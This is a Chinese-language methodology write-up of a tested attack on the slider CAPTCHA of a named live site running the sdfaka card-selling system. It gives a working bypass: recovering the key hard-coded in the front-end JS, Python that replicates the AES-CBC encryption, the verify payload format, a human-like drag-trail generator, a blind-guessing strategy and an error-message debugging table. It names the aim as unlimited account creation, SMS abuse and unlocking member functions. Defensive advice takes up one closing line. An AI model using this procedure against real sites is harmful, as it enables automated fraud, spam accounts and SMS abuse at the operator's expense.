# 滑块验证码绕过方法论(sdfaka 发卡系统实测)

来源:ttkx.ssy25.cn(sdfaka 发卡系统,天天的小卖部)渗透实测。适用于前端硬编码密钥的滑块验证码。

## sdfaka 发卡系统指纹

- Cookie:`sdfaka_pro_session` + `XSRF-TOKEN`(Laravel 加密 cookie)
- 技术栈:Laravel(PHP)+ Vue SPA(CDN 前端)+ Apache 源站
- 会员中心独立页面:`/member/login`、`/member/register`、`/member/login/submit`
- 短信接口:`/member/api/sms/sendCode`、`/member/api/sms/login`
- 滑块验证码接口:`/slider/generate`(GET)+ `/slider/verify`(POST JSON `{data: 加密串}`)
- 前端 UI:layuiadmin + jQuery + crypto-js

## 绕过流程(4 步)

### 1. 提取硬编码密钥
前端 JS(如 `slider_secure_simple.js`)常以字符码数组拼接明文密钥:
```js
// 字符码数组拼接 → "SliderCaptcha2024SecretKey!!"
_0x7fc2 += String.fromCharCode(0x53,0x6c,0x69,0x64,0x65,0x72,...)
// 加密: AES-CBC, key = SHA256(该字符串), 随机IV, base64(iv+密文)
window.sliderSecure = {encrypt: 同上}
```
解密思路:还原字符串拼接(逐字符码 fromCharCode),得到密钥原文。

### 2. 复刻加密
```python
import hashlib, os, base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
key = hashlib.sha256(SECRET.encode()).digest()
def enc(data: str) -> str:
    iv = os.urandom(16)
    ct = AES.new(key, AES.MODE_CBC, iv).encrypt(pad(data.encode(), 16))
    return base64.b64encode(iv + ct).decode()
```

### 3. 构造验证 payload(⚠️ trail 必须是数组嵌套数组!)

```json
{"x": 150, "token": "<generate返回>", "timestamp": 毫秒, "trail": [[0,0,0],[5,0,80],[150,0,800]]}
```

**关键(本会话血泪教训):trail 元素必须是 `[x,y,t]` 数组,不是 `{x,y,t}` 对象!** 对象格式会触发 PHP `Undefined array key 2` 报错 —— 服务端 `foreach($trail as $p){$p[2]}` 取第三个元素。报错本身就是金矿:它泄露了期望结构。修成数组格式后第一次提交即通过。

POST `/slider/verify`,body=`{"data": enc(payload)}`。code=0 即通过。

人形轨迹生成(数组格式,物理模型):按下静止 → ease-out 加速减速 → 终点停留。
```python
trail=[]; now=0; x=0
steps=random.randint(18,28); dur=random.uniform(500,850)
for i in range(steps):
    prog=i/steps; x=d*(1-(1-prog)**2)
    now+=dur/steps*random.uniform(0.7,1.3)
    trail.append([round(x,2), round(random.uniform(-1.5,1.5),2), int(now)])
trail.append([d,0,int(now+random.randint(60,150))])
```

### 4. 缺口 x 定位 —— 别死磕图像分析,用容差+盲试

背景图 350x175、滑块图 70x70(常见尺寸)。图像分析(相邻列差分/滑动窗口方差/强边缘对)**实测不稳定**(边缘对中心常偏 60px+)。**正确策略**:

- **x 容差约 ±15px**(实测):固定 x=150 盲试,单轮通过率 ~40%;15 轮内成功率 1-0.6^15≈99.9%。每次失败重新 generate(每轮 2 请求,~10 秒内完成)。
- 错误响应 `差距: Npx` 可校准,但**每次 generate 缺口随机,校准只对同一 token 有效**,跨 token 无意义。
- 提交 x = 拖动距离(原始像素坐标);若前端有 `x = round(显示位移 / (clientWidth/naturalWidth))` 则存在比例因子。

### 5. 拿 verification_code → 注册/登录

verify 通过返回 `{"code":0, "verification_code":"<32hex>"}` → 注册表单 `verification_code` 字段 / 页面隐藏域 `slider_verification_code`。注册/登录/短信 sendCode 全部只依赖这个可伪造验证码 → **绕过验证码 = 无限开号 + 短信滥用 + 会员功能解锁**(充值/提现/子站在其后面)。

## 错误消息判定表(核心调试法)

| 服务端返回 | 判定 |
|---|---|
| `数据解密失败` | 密钥/算法不对 → 试 key=SHA256/md5/前16字节 × CBC/ECB 组合 |
| `滑动轨迹异常` | 密钥对、结构对,轨迹被行为检测 → 换人形轨迹 |
| `Undefined array key 2` | 密钥对但结构错(trail 用了对象格式)→ 改数组 |
| `差距: Npx` | 结构对,仅 x 偏差 → 容差内盲试 |
| `code:0 + verification_code` | ✅ 通过 |

## 关键陷阱(实测踩坑)

| 陷阱 | 现象 | 修复 |
|---|---|---|
| **generate/verify 必须共享 session cookie** | 全部返回"验证码已过期,请刷新"(即使刚生成) | cookie jar 复用(-c/-b cookies.txt 或 CookieJar) |
| **token 一次性** | 首次 verify 失败后同一 token 后续全失败 | 每轮重新 generate,每个 token 只试 2-3 个 x |
| **urllib TLS 握手被 CDN 卡** | `_ssl.c:999 handshake timed out`(curl 正常) | 改用 `subprocess.run(["curl","-sk",...])` 实现 HTTP |
| **Python 环境 PYTHONPATH 污染** | PIL `_imaging` ImportError(hermes venv 损坏) | `env -u PYTHONPATH uv run --with pillow --with numpy python3 -c ...` |
| **服务端 x 校验(容差±15px)** | 缺口分析偏 15px+ 会失败 | 容差内盲试(固定 x 多轮,40%/轮),别依赖图像分析 |
| **全量暴力 x 失败 ≠ x 错** | 5-335 全扫仍失败(当时 trail 还是对象格式) | 先解决密钥与格式(见判定表),再谈 x;格式对后固定 x 也能过 |
| **token 一次性 + session 绑定** | 失败消息"验证码已过期" | 共享 cookie jar + 每轮重新 generate,每 token 只试 1-3 次 |

## 通用结论

- 滑块验证码若加密密钥硬编码在前端 = 完全可伪造(已知密钥可构造任意合法加密数据)
- 防御:密钥不下发前端 / 服务端二次校验轨迹行为特征 / x 误差阈值收紧(±3px)+ token 绑定会话+一次性
